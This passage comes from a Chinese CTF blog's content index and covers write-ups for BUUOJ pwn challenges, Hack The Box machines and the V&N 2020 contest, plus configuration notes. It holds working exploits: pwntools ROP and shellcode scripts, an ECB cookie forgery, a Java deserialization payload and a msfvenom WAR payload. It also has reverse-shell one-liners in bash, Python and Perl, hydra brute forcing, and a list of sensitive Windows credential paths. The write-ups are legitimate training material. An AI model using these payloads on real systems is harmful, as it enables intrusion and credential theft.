shellcode=b\"\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xb0\\x0b\\xcd\\x80\"payload = shellcodepayload += \"a\" * (0x8c - len(shellcode))payload += p64(addr)io.send(payload)io.interactive() 看了下南梦师傅的exp, 不是很懂, 后面再研究看看, 菜鸡pwn手的心理受到了巨大的创伤 jarvisoj_level2学习了一下南梦师傅的exp写法, 这题其实就是找system然后执行就可以了 或者这里 exp如下 1234567891011121314151617181920212223242526from pwn import *context.log_level = 'debug'context.arch = 'i386'elf = ELF(\"./level2\")sh = 0lib = 0def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level2\") else: sh = remote(ip, port) bin_sh_addr = elf.search(\"/bin/sh\").next() # system_addr = elf.[\"system\"] system_addr = 0x804849E # print(bin_sh_addr) print(system_addr) payload = \"a\" * (0x88 + 0x4) payload += p32(system_addr) payload += p32(bin_sh_addr) sh.send(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 26653, 0) jarvisoj_level2_x6432位和64位在函数传参的地方有所不同, 64位前6个参数是放在寄存器上, 第一个是rdi, 所以我们要想办法把/bin/sh传入rdi, 这里需要用到ROPgadget 可以看到程序找到了一些可用的汇编语句, 我们先来看一下红框中的语句 1pop rdi ; ret pop rdi: 将栈顶的数据弹出, 传给rdi ret: 将栈顶的数据弹出, 跳转到该地址 我们依次传入/bin/sh和system的地址, 栈上的状态如下 12/bin/shsystem 那么我们就可以顺利的将rdi加载为/bin/sh 构造exp如下 12345678910111213141516171819202122232425from pwn import *context.log_level = 'debug'context.arch = 'amd64'elf = ELF(\"./level2_x64\")sh = 0lib = 0def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level2_x64\") else: sh = remote(ip, port) pop_rdi_ret_addr = 0x4006b3 bin_sh_addr = elf.search(\"/bin/sh\").next() system_addr = 0x400603 payload = \"a\" * (0x88) payload += p64(pop_rdi_ret_addr) payload += p64(bin_sh_addr) payload += p64(system_addr) sh.send(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 25012, 0) jarvisoj_level3 看一下vuln函数 这次开启了NX保护, 也没有后门函数, 就只能去libc里面找了 但是这里坑的地方就是, 我去翻了题目github地址的libc是2.19, 实际上并不是, 然后就一直time_out… 我们想要利用libc中自带的函数, 需要先找到基址, 而write函数就可以用来泄露地址, 然后与我们本地的相减就能求出基址, 就可以实现任意调用了 libc的部分参考网上的wp使用了LibcSearcher来找, 就很顺利了hhh exp如下 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'i386'elf = ELF(\"./level3\")sh = 0# lib = ELF(\"./libc-2.19.so\")def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level3\") else: sh = remote(ip, port) # leak write payload = \"a\" * (0x88 + 0x4) payload += p32(elf.plt['write']) payload += p32(0x8048495) # vuln payload += p32(0x1) payload += p32(elf.got['write']) payload += p32(0x4) sh.recvuntil(\"Input:\\n\") sh.send(payload) write_addr = u32(sh.recv(4)) # calc system & /bin/sh lib = LibcSearcher(\"write\", write_addr) image_base = write_addr - lib.dump(\"write\") system_addr = image_base + lib.dump(\"system\") bin_sh_addr = image_base + lib.dump(\"str_bin_sh\") # getshell payload = \"a\" * (0x88 + 0x4) payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(bin_sh_addr) sh.recvuntil(\"Input:\\n\") sh.sendline(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 25297, 0) pwn的快乐暂时到这里了, 后面有空再玩一下 [BSidesCF 2019]Mixer这道题挺巧妙的, 如果看过WP的话可以知道这是AES的ECB翻转攻击 首先要打开burp的这个设置 这样方便我们跟随跳转而不用手动设置cookie 登录后可以看到多了一个user的cookie, 并且提示说 1And you can safely ignore the rack.session cookie. Like actually. But that other cookie, however.... (中间省略一堆日cookie的时间) 我们先随便改一位试试 发现报错, 是一个json的解密, 乱码的只有我们修改的那个块, 可以推测是ECB加密, 如果是CBC的话, 前面也会变成乱码 我们知道ECB加密是16位一组, 并且每组互相独立, 加密后为32位, 而这里的目标是让is_admin变成1, 单纯的翻转的话不太好操作, 毕竟我们不知道IV, 但是在json中 11.0 = 1 那如果我们构造刚好16位, 也就是1.00000000000000, 使得这个块独立加密, 然后再放到is_admin中, 就可以将is_admin变成1了 先写出json 1{\"first_name\":\"\",\"last_name\":\"\",\"is_admin\":} 观察到前面的 1{\"first_name\":\" 总共15位, 加上一位就可以变成16位, 即这样 1{\"first_name\":\"A1.00000000000000\",\"last_name\":\"\",\"is_admin\":} 就可以顺利获取我们需要的1.00000000000000的加密块了 再观察后面, 使得 1\",\"last_name\":\"\",\"is_admin\": 为16的整数倍, 中间需要填充4个字符, 也就是 1{\"first_name\":\"A1.00000000000000\",\"last_name\":\"A333\",\"is_admin\":} 那么这个json会被分为5个部分加密 12345{\"first_name\":\"A1.00000000000000\",\"last_name\":\"A333\",\"is_admin\":} 其中最后一个块会被填充到16位, 我们首先将上面的json以get方式提交 1/?action=login&first_name=A1.00000000000000&last_name=A333 然后获取cookie 12a3a97a1e1a60d30206bd0710c7d6436c21965416ed467e21d650a0e019b68eff2c3b097feb7610eb39b30a3bddadcd1967867848b5b83d2629292395c9af2835c8ac8596bd3f958383991f95d145726 33-64位, 添加到最后的32位之前 12a3a97a1e1a60d30206bd0710c7d6436c21965416ed467e21d650a0e019b68eff2c3b097feb7610eb39b30a3bddadcd1967867848b5b83d2629292395c9af283c21965416ed467e21d650a0e019b68ef5c8ac8596bd3f958383991f95d145726 就可以看到flag了 [BSidesCF 2019]Futurella 看到奇怪的东西, 还以为是在做misc, 实际上真的是misc 签到题了解一下 [BSidesCF 2019]SVGMagic原来这题是要看图片的… svg其实就是xml, 所以还是xxe, 不过我一直以为解码base64就会看到, 直到我打开了图片hhh 后面就随便读了 [BSidesCF 2019]FlagSrv本文作者: cjm00n本文地址: https://cjm00n.top/2020/02/18/Buu刷题记录3/ 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。","link":"/2020/02/18/Buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/"},{"title":"CSRF学习之旅","text":"看了 p 神知识星球最近关于校招知识点的整理, 于是想对 CSRF 做一些知识性的总结和学习 😄 更新中 题目CSRF 相关的内容, 域的概念, 跨域的方法, CSRF 防御的各种方法对比, Same_site Cookie 概念实战参考 前端安全系列之二：如何防止 CSRF 攻击 本文作者: cjm00n本文地址: https://cjm00n.top/2020/03/04/CSRF学习之旅/ 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。","link":"/2020/03/04/CSRF%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/"},{"title":"Config文档","text":"记录下常用的配置 git proxy让 git 走代理, 基本可以达到满速 1git config --global http.https://github.com.proxy socks5h://127.0.0.1:10808 删除代理 1git config --global --unset http.https://github.com.proxy zsh12apt install zshsh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" zshrc12345678910111213# themeZSH_THEME=\"ys\"# aliasalias ctf=\"cd /mnt/hgfs/ctf\"alias tools=\"cd /mnt/hgfs/tools\"alias clash=\"~/clash/clash -d ~/clash/\"alias htbvpn=\"openvpn ~/cjM00N.ovpn\"alias pc=\"proxychains\"alias tmuxa=\"tmux a -t\"alias tmuxn=\"tmux new -s\"alias vi=\"vim\"alias burp=\"/opt/Burpsuite/start.sh\" 内外网切换12345netstat -nr 查看路由表sudo route delete 0.0.0.0 删除默认路由sudo route add -net 0.0.0.0 192.168.1.1 默认使用192.168.1.1网关sudo route add 10.200.0.0 10.200.22.254 有线网卡使用该网关sudo route add 10.0.1.0/24 10.200.22.254 其它网段指定网关 切换 java 版本1update-alternatives --config java tmux 配置123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# reload with Ctrl+rbind C-r source-file ~/.tmux.conf \\; display \"Reloaded!\"# tmux attachnew-session# vi keymapset-option -g status-keys viset-window-option -g mode-keys vi# vi-type selection and copybind -T copy-mode-vi v send-keys -X begin-selectionbind -T copy-mode-vi y send-keys -X copy-selection-and-cancel# choose pane with vi-keybind -r ^k selectp -Ubind -r ^j selectp -Dbind -r ^h selectp -Lbind -r ^l selectp -R# exec command manbind m command-prompt \"splitw -h 'exec man %%'\"# add Ctrl+a to prefix keyset -g prefix2 C-abind C-a send-prefix -2# new pane - =# horizontalunbind '\"'bind - splitw -v -c '#{pane_current_path}'# verticalunbind %bind = splitw -h -c '#{pane_current_path}'# colorset -g default-terminal \"screen-256color\"# renamesetw -g automatic-rename offsetw -g allow-rename off# mouseset -g mouse on# ------ status theme -------------------------------set -g message-style \"bg=#00346e, fg=#ffffd7\" # tomorrow night blue, base3set -g status-style \"bg=#00346e, fg=#ffffd7\" # tomorrow night blue, base3set -g status-left \"#[bg=#0087ff] > #S \" # blueset -g status-left-length 400set -g status-right \"#[bg=#0087ff] #(whoami)@#h #[bg=red] %Y-%m-%d %H:%M \"set -g status-right-length 600set -g set-clipboard onset -g history-limit 8000set -wg window-status-format \" #I #W \"set -wg window-status-current-format \" #I #W \"set -wg window-status-separator \"\"set -wg window-status-current-style \"bg=red\" # redset -wg window-status-last-style \"fg=#dddddd\"set -wg pane-active-border-style \"fg=blue\"set -wg pane-border-style \"fg=#585858\" # base01set -g status-justify left powershell 设置别名打开配置文件 1code $PROFILE 设置别名样例如下 1234function cdTools{ Set-Location D:\\tools}Set-Alias tools cdTools 重启 powershell 即可如果是带参数的命令, 则可以通过$args来获取, 例如自动新建并打开 md 12345function newPost{ cdBlog hexo new \"$args\" code D:\\CTF\\blog\\source\\_post\\$args.md} 这里没有处理对于文件名的转换问题, 比如空格, 特殊符号等 整理如下 1234567891011121314151617181920212223242526function cdBlog{ Set-Location D:\\CTF\\blog}function cdTools{ Set-Location D:\\tools}function cdCTF { Set-Location D:\\CTF}function cdDownload { Set-Location D:\\xxx\\Downloads}function exThere { explorer.exe .}function pushBlog { cdBlog hexo clean; hexo d -g;}Set-Alias blog cdBlogSet-Alias tools cdToolsSet-Alias ctf cdCTFSet-Alias down cdDownloadSet-Alias ex exThereSet-Alias hexod pushBlog 本文作者: cjm00n本文地址: https://cjm00n.top/2019/10/24/Config文档/ 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。","link":"/2019/10/24/Config%E6%96%87%E6%A1%A3/"},{"title":"HTB-Hack之旅","text":"我tcl MachinesBashed难度是ctf中的白给题 打开界面如下 点击phpbash后会跳转到github, 可以看到源码如下 123456if (ISSET($_POST['cmd'])) { $output = preg_split('/[\\n]/', shell_exec($_POST['cmd'].\" 2>&1\")); foreach ($output as $line) { echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . \"\"; } die(); 可以看到直接将命令传入shell, 不过有个2>&1, 会使得一些shell命令不执行 这里是根据wp一步一步做的, 首先看一下nmap 1nmap -sC -sV -oA nmap/init 10.10.10.68 nmap的命令可以参考 https://github.com/erasin/notes/blob/master/linux/safe/nmap.md -sC: 等价于 –script=default, 使用默认类别的脚本进行扫描 -sV: 指定让Nmap进行版本侦测 -oA: 输出至所有格式 可以看到结果如下 然后探测一下目录 1gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 结果如下 访问一下分别得到 123/dev/phpbash.php/php/sendmail.php/uploads/ (NULL) 然后可以通过phpbash来直接执行命令, 首先传一个LinEnum.sh查看一下系统的敏感信息 123456# localpython -m SimpleHTTPServer 8000# remotecd uploadswget http://ip:8000/LinEnum.sh bash LinEnum.sh 结果如下 12345678910[00;31m[-] Super user account(s):[00mroot[00;33m[+] We can sudo without supplying a password![00mMatching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL 看到有个无密码的账号scriptmanager 那我们再反弹个shell, 可以使用系统自带的php文件 1/usr/share/webshells/php/php-reverse-shell.php 修改ip和端口后, 在uploads写入 1wget http://ip:8000/php-reverse-shell.php 然后访问就可以拿到shell了 再利用附录的升级方法即可获得交互shell, 然后登录进scriptmanager 1su -u scriptmanager bash 可以在/下看到有个scripts文件夹, 访问之, 下面有个root权限的文件 如果可以看到test.py的原内容的话, 他其实是修改了test.txt, 这就说明test.py的执行其实是由root执行的, 但是我们可以写, 那就将内容改为反弹shell 1234567import socket,subprocess,os,ptys=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"ip\",port))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)pty.spawn(\"/bin/bash\") 然后本地监听即可 1nc -lvvp 2334 成功获取root权限 Lame首先进行全面的扫描 1nmap –T4 –A –v targethost -T4: T表示速度(0-5), 值越大则越快 -v: 显示冗余信息 -A: 进攻性的扫描 扫描结果如下, 可以看到有21和139和445应该是可以打的 尝试了一下21端口的vsftpd 2.3.3还真的没打通—, wp诚不欺我 1explort/unix/ftp/vsftpd_234_backdoor 老老实实跟着wp打 1234search CVE-2007-2447use exploit/multi/samba/usermap_script set RHOSTS 10.10.10.3run 然后就是root了 Legacy跟前一题很像, 还是nmap开局 1nmap -T2 -A -v -oA nmap/init 10.10.10.3 xp的机器, 开了smb, 这里可以用MS-08-067来打 理想是丰满的, 这一步我卡了很久很久(国内网络太差了) Jerry1nmap -sC -sV -oA nmap/init 10.10.10.95 8080开放, 访问它, gogo 可以看到是默认的tomcat页面, 有三个选项 server status: admin:admin可以直接访问, 但是没啥用, 查看另外两个, admin无法登陆, 使用hydra爆破 这里其实账号和密码都是明文的, 但是一般还是不会直接给出的, 所以这里还是按照wp的步骤爆破 12apt install seclistshydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html admin:admin不成功, 但是不知道为啥hydra给出来了, 我们这里使用tomcat:s3cret登录 登录进来后有了部署权, 可以传jsp马来getshell 首先使用msfvenom创建一个反弹shell的war马 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.10 LPORT=2334 -f war -o jerry.war 然后查看一下包里面的jsp文件地址 12mkdir tmpcd tmp && unzip ../jerry.war 再部署到tomcat上面, 本地msf监听一下 123456msfdb runuse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset LHOST tun0set LPORT 2334run # run -j 后台启动 访问tomcat上面的地址, 就可以在本地接到shell了, 下面是flag ippsec的视频做的真的好, 强烈建议看一看 Netmon1nmap -sC -sV -oA nmap/init 10.10.10.152 可以看到有ftp服务, 连上去康康 123ftp 10.10.10.152# user: Anonymous# pwd: Anonymous 登录之后可以拿到用户的flag 继续进行信息搜集, 我们可以根据下面的字典进行探测 https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768C:/Users/Administrator/NTUser.datC:/Documents and Settings/Administrator/NTUser.datC:/apache/logs/access.logC:/apache/logs/error.logC:/apache/php/php.iniC:/boot.iniC:/inetpub/wwwroot/global.asaC:/MySQL/data/hostname.errC:/MySQL/data/mysql.errC:/MySQL/data/mysql.logC:/MySQL/my.cnfC:/MySQL/my.iniC:/php4/php.iniC:/php5/php.iniC:/php/php.iniC:/Program Files/Apache Group/Apache2/conf/httpd.confC:/Program Files/Apache Group/Apache/conf/httpd.confC:/Program Files/Apache Group/Apache/logs/access.logC:/Program Files/Apache Group/Apache/logs/error.logC:/Program Files/FileZilla Server/FileZilla Server.xmlC:/Program Files/MySQL/data/hostname.errC:/Program Files/MySQL/data/mysql-bin.logC:/Program Files/MySQL/data/mysql.errC:/Program Files/MySQL/data/mysql.logC:/Program Files/MySQL/my.iniC:/Program Files/MySQL/my.cnfC:/Program Files/MySQL/MySQL Server 5.0/data/hostname.errC:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.logC:/Program Files/MySQL/MySQL Server 5.0/data/mysql.errC:/Program Files/MySQL/MySQL Server 5.0/data/mysql.logC:/Program Files/MySQL/MySQL Server 5.0/my.cnfC:/Program Files/MySQL/MySQL Server 5.0/my.iniC:/Program Files (x86)/Apache Group/Apache2/conf/httpd.confC:/Program Files (x86)/Apache Group/Apache/conf/httpd.confC:/Program Files (x86)/Apache Group/Apache/conf/access.logC:/Program Files (x86)/Apache Group/Apache/conf/error.logC:/Program Files (x86)/FileZilla Server/FileZilla Server.xmlC:/Program Files (x86)/xampp/apache/conf/httpd.confC:/WINDOWS/php.iniC:/WINDOWS/Repair/SAMC:/Windows/repair/systemC:/Windows/repair/softwareC:/Windows/repair/securityC:/WINDOWS/System32/drivers/etc/hostsC:/Windows/win.iniC:/WINNT/php.iniC:/WINNT/win.iniC:/xampp/apache/bin/php.iniC:/xampp/apache/logs/access.logC:/xampp/apache/logs/error.logC:/Windows/Panther/Unattend/Unattended.xmlC:/Windows/Panther/Unattended.xmlC:/Windows/debug/NetSetup.logC:/Windows/system32/config/AppEvent.EvtC:/Windows/system32/config/SecEvent.EvtC:/Windows/system32/config/default.savC:/Windows/system32/config/security.savC:/Windows/system32/config/software.savC:/Windows/system32/config/system.savC:/Windows/system32/config/regback/defaultC:/Windows/system32/config/regback/samC:/Windows/system32/config/regback/securityC:/Windows/system32/config/regback/systemC:/Windows/system32/config/regback/softwareC:/Program Files/MySQL/MySQL Server 5.1/my.iniC:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xmlC:/Windows/System32/inetsrv/config/applicationHost.configC:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log 接下来需要获取root权限, 先离开ftp看看其他的端口, 个人信息1234# ip10.10.14.10# bashbash -i >& /dev/tcp/10.10.14.10/2333 0>&1 交互式shell半交互式12# python ptypython -c 'import pty;pty.spawn(\"/bin/bash\")' 此时可以实现简单的交互, 处于半交互状态, 但是不能用vim这种命令 交互式首先将shell放到后台 1ctrl + z 然后执行 1stty raw -echo 接着使用fg将shell返回前台 1fg 现在的shell看起来会比较奇怪, 使用reset 1reset 再导入如下配置即可 123export SHELL=bashexport TERM=xterm256-colorstty rows 24 columns 80 吐槽一下为啥进入交互式后shell特别卡—- 参考资料 https://bbs.ichunqiu.com/thread-54982-1-1.html 本文作者: cjm00n本文地址: https://cjm00n.top/2019/11/24/HTB-Hack之旅/ 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。","link":"/2019/11/24/HTB-Hack%E4%B9%8B%E6%97%85/"},{"title":"Minos主题修改指南","text":"对现在使用的Minos主题做了些修改, 做一下记录 极缓慢更新 Tags页面修改打开下面的文件 1theme/minos/layout/tags.ejs 第4行修改为 tags.ejs1 第13行去掉# 1&nbsp;() 效果如下 版权声明使用的是 1hexo-addlink 插件, 安装后在根目录的 _config.xml 中加入 _config.xml123addlink: before_text: \"{% colorquote info %}本文作者：author本文地址：\" after_text: \"版权声明：除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。{% endcolorquote %}\" 效果如下 这里使用了 hexo-tag 插件优化引用效果, 不需要删除大括号内容即可 hexo-tag这里主要是展示一下效果, 方便要用的时候可以调用, 具体可以看主题作者的使用说明 https://blog.zhangruipeng.me/hexo-theme-minos/Using-Hexo-Tag-Plugins-in-Minos/ 123{% colorquote [type] %}text {% endcolorquote %} This is info text This is success text This is warning text This is danger text 固定导航栏在多级界面的时候, 感觉还是固定导航栏更实用, 我的做法比较粗暴 1theme/minos/source/js/script.js 第18行, 注释定时器即可 123456// setInterval(function() { // if (didScroll) { // hasScrolled(); // didScroll = false; // } // }, 250); 效果就是不会消失了hhhh 文章访问计数使用的是不蒜子的计数, 没有做什么效果, 直接引入 1theme/minos/layout/footer.ejs 第10行后插入 footer.ejs1234567 clicked: times 顺便改了前面的提示字符, 在第五行 footer.ejs1 &nbsp; 效果如下 RSS使用的是 1hexo-generator-feed 同样安装后在根目录的 1_config.xml 添加下面的内容 _config.xml12345678feed: type: atom path: rss.xml limit: 20 hub: content: content_limit: content_limit_delim: ' ' 再到 1/theme/minos/_config.xml 添加图标 _config.xml1234navbar_links: RSS: icon: fas fa-rss url: /rss.xml 然后重新生成 1hexo clean; hexo g; 效果如下 就可以快乐的添加订阅了 时间格式更新将时间格式改为具体的日期 本文作者: cjm00n本文地址: https://cjm00n.top/2020/02/25/Minos主题修改指南/ 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。","link":"/2020/02/25/Minos%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9%E6%8C%87%E5%8D%97/"},{"title":"V&N公开赛2020 writeup","text":"给赵师傅递茶, AK是不可能AK的 checkin首先是签到题, 先看一下代码 123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(\"flag.txt\", \"r\")# flag = flag_file.read()# flag_file.close()## @app.route('/flag')# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route('/shell')def shell(): os.system(\"rm -f flag.txt\") exec_cmd = request.args.get('c') os.system(exec_cmd) return \"1\"@app.route('/')def source(): return open(\"app.py\",\"r\").read()if __name__ == \"__main__\": app.run(host='0.0.0.0') 首先可以明确, 在我们执行命令的时候这个flag.txt已经被删了, 不存在什么条件竞争的 而我们观察一下程序的步骤 123flag_file = open(\"flag.txt\", \"r\")....os.system(\"rm -f flag.txt\") 第一步先打开了文件, 然后再对文件删除, 看到这个就想起了一个远古的知识点, 我也不记得是学什么看到的了 https://blog.csdn.net/wyzxg/article/details/12654639 当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里, 而具体的位置在 1/proc//fd/ 下面用本地的例子举例 首先创建flag.txt 然后运行 1python app.py 之后我们访问shell, 就可以看到文件已经被删除了 如何找到文件在内存中的位置呢, 利用lsof 1lsof|grep flag.txt 其中第二列的3512就是 在程序中打开 12cd /proc/3512/fdls -al 可以看到3就是我们需要的文件, 直接cat即可 不过这里有两个问题, 首先是如何反弹shell 在做题的时候发现 (使用内网的linux labs), 在环境中执行 1curl http://ip:port 却不能监听到访问, 一度怀疑不在内网, 还重开了两次 (错失一血hhh 这里歪个楼, 在出题人的环境配置不对的情况下, 我们可以通过 1ls|base64>>app.py 的方式来写入app.py, 从而不用反弹shell也可以看到回显, 当然赵师傅没留下这个机会(x 上网搜了很多个反弹shell的payload http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html 最后找到一个能用的 1perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"ip:port\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while;' 然后成功返回shell, 但是发现第二个问题, 上面没有lsof, ps也没有反应 进去 1cd /proc/ 看了一下, 发现只有几个, 就直接遍历一下hhhh 很快就能看到了 TimeTravel代码很简洁, 很赵师傅 12345678910111213141516171819202122232425get('http://127.0.0.1:5000/api/eligible'); $content = $response->getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) { echo system('/readflag'); }}if(isset($_GET['file'])) { highlight_file($_GET['file']);}if(isset($_GET['phpinfo'])) { phpinfo();} 我们先看熟悉的部分, 下面可以看到有读文件和phpinfo的地方, 我们就先看phpinfo 没有什么有意思的地方( 大概 然后我们就读文件吧, 这种程序的结构和tp很像, 我们首先读一下 1composer.json 可以明确的是, 程序代码这么少, 肯定是组件洞, 总不能一个highlight_file就能RCE是吧hhhh 但是不急, 继续读一读, 我很好奇中间的这个 1http://127.0.0.1:5000/api/eligible 是什么, 这个怎么读呢, 我们知道docker一般会有个start.sh, 经常会在根目录或者/tmp或者~, 试一下就会发现在根目录 然后就能看到程序的路径, 读一下 1/srv/app.py 这里题目已经很明确了, 只要等到2050年就可以拿到flag, 因此这里我就等了 (xxx 读完了源码我们去看看原来的那个组件的版本, 有没有什么漏洞 搜一下很快就会发现下面这些东西 https://httpoxy.org/ https://www.laruence.com/2016/07/19/3101.html 就是说这个程序会将请求头中的 1PROXY:ip:port 注册为全局变量, 类似于 1http_proxy=ip:port command 所以我们只需要劫持一下返回即可 在Linux labs里面, 先建一个index.php 1234true); header(\"Content-Type:application/json\"); echo json_encode($arr); 然后运行 1php -S 0:2333 有师傅后面问到, 这里提一下, 代理并不需要和原来的端口以及路径一致, 只需要给一个合适的返回就可以了, 而这个命令是启动php内置的一个web服务器, 如果文件名为index.php 我们可以通过 1http://ip:port/ 来访问, 如果是其他的命名则需要 1http://ip:port/filename.php 这样来访问, 因此这里必须要设置为index.php 后面加上请求头访问即可 HappyCTFd看到就猜是CTFd的漏洞了, 毕竟前段时间刚爆了一个 https://www.colabug.com/2020/0204/6940556/ 大概就是说, 在忘记密码验证的时候, 会对用户名进行 1strip() 的操作, 那么我们只需要注册一个 1admin 的账号, 然后忘记密码即可接管管理员的账号(需要使用内网邮件系统) 这个就不演示了, 登录后可以进去管理界面, 搭过CTFd的应该都知道, 他里面有一个 1Backup 的功能, 会把所有的记录备份下来, 我们直接用它下载全部内容 就可以看到flag了 EasySpringMVC是个java题, 人生第一个正经java题, 然而没做出来— 先看一下代码, 我们可以使用jd-gui打开这个war包 看一眼web.xml 看不出啥有用的, 就去翻代码, 为了好看一点我复制出来在vscode看了 在 1WEB-INF\\classes\\com\\filters\\ClientInfoFilter.java 可以看到有这段, 明显是一个反序列化构造, 可以伪造cookie变成管理员 编写exp如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.*;import java.util.Base64;import com.tools.*;public class test { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { ClientInfo cinfo = new ClientInfo(\"admin\", \"webmanager\", \"CC79398F535DB34F13B667D3C079BF00\"); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e) { e.printStackTrace(); } }}class Tools implements Serializable { private static final long serialVersionUID = 1L; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } private String testCall; public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[]) obj)).start(); }} 还需要把ClientInfo类放在 1com/tools/ClientInfo.java 把构造类的第三个参数设置为你的SESSIONID即可 运行后将输出的base64填到cookie就可以了 然后我们就能获得文件上传的机会, 但是问题就在这里, 我经过很多次尝试 发现只能上传在 1/tmp 目录下 其他的目录就会permission denied 而我们的调用是这样的 12345678910111213141516171819202122232425262728293031public class PictureController{ @RequestMapping({\"/showpic.form\"}) public String index(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file) throws Exception { if (file == null) file = \"showpic.jsp\"; String[] attribute = file.split(\"\\\\.\"); String suffix = attribute[attribute.length - 1]; if (!suffix.equals(\"jsp\")) { boolean isadmin = ((ClientInfo)httpServletRequest.getSession().getAttribute(\"cinfo\")).getName().equals(\"admin\"); if (!isadmin && (!suffix.equals(\"jpg\") || !suffix.equals(\"gif\"))) { return \"onlypic\"; } show(httpServletRequest, httpServletResponse, file); return \"showpic\"; } StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i < attribute.length - 1; i++) { stringBuilder.append(attribute[i]); } String jspFile = stringBuilder.toString(); int unixSep = jspFile.lastIndexOf('/'); int winSep = jspFile.lastIndexOf('\\\\'); int pos = (winSep > unixSep) ? winSep : unixSep; jspFile = (pos != -1) ? jspFile.substring(pos + 1) : jspFile; if (jspFile.equals(\"\")) { jspFile = \"showpic\"; } return jspFile; } 可以看到主要分两部分, 一部分是后缀名为jsp 12345678910111213StringBuilder stringBuilder = new StringBuilder();for (int i = 0; i < attribute.length - 1; i++) { stringBuilder.append(attribute[i]);}String jspFile = stringBuilder.toString();int unixSep = jspFile.lastIndexOf('/');int winSep = jspFile.lastIndexOf('\\\\');int pos = (winSep > unixSep) ? winSep : unixSep;jspFile = (pos != -1) ? jspFile.substring(pos + 1) : jspFile;if (jspFile.equals(\"\")) { jspFile = \"showpic\";}return jspFile; 搜了搜是来自一个挺官方的库, 没啥方法可以用, 这个jspFile后面会经过 就会变成 1/WEB-INF/*.jsp 很遗憾这个文件夹我们是没有能力上传的, 并且前面还有一个 12String[] attribute = file.split(\"\\\\.\"); String suffix = attribute[attribute.length - 1]; 去掉所有的., 也不能目录穿越, 而如果后缀不是jsp 123456String[] attribute = file.split(\"\\\\.\");String suffix = attribute[attribute.length - 1];if (!suffix.equals(\"jsp\")) { show(httpServletRequest, httpServletResponse, file); return \"showpic\";} show方法如下 12345678910111213141516private void show(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename) throws Exception { httpServletResponse.setContentType(\"image/jpeg\"); InputStream in = httpServletRequest.getServletContext().getResourceAsStream(\"/WEB-INF/resource/\" + filename); if (in == null) { in = new FileInputStream(filename); } ServletOutputStream servletOutputStream = httpServletResponse.getOutputStream(); byte[] b = new byte[1024]; while (in.read(b) != -1) { servletOutputStream.write(b); } in.close(); servletOutputStream.flush(); servletOutputStream.close(); } 首先第一个获取的地方 1InputStream in = httpServletRequest.getServletContext().getResourceAsStream(\"/WEB-INF/resource/\" + filename); 